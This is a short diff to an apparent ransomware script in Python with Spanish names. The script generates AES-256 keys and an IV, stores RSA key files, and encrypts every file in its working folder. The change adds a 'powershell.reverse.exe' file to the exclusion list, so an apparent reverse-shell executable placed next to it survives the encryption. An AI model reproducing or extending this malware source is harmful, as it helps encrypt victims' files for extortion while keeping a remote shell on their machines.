@@ -28,7 +28,7 @@ archivo_clave_aes = os.path.join(carpeta_claves, "ClaveAES.enc")
 archivo_iv = os.path.join(carpeta_claves, "IV.txt")
 archivo_clave_privada = os.path.join(carpeta_claves, "ClavePrivada.pem")
 archivo_clave_publica = os.path.join(carpeta_claves, "ClavePublica.pem")
-
+archivo_conex = os.path.join(directorio_actual, "powershell.reverse.exe")
 # Función para generar una clave AES y un IV aleatorios
 def generar_clave_iv():
     clave_aes = os.urandom(32)  # Generar 32 bytes aleatorios para AES-256 (256 bits)
@@ -152,7 +152,7 @@ def mostrar_archivo(ruta_archivo):
 
 # Obtener archivos a cifrar
 def obtener_archivos_a_cifrar():
-    archivos_a_ignorar = {archivo_clave_aes, archivo_iv, archivo_clave_privada, archivo_clave_publica, __file__}
+    archivos_a_ignorar = {archivo_clave_aes, archivo_iv, archivo_clave_privada, archivo_clave_publica, __file__, archivo_conex}
     archivos_en_carpeta = set(os.path.join(directorio_actual, archivo) for archivo in os.listdir(directorio_actual))
     return archivos_en_carpeta - archivos_a_ignorar
 
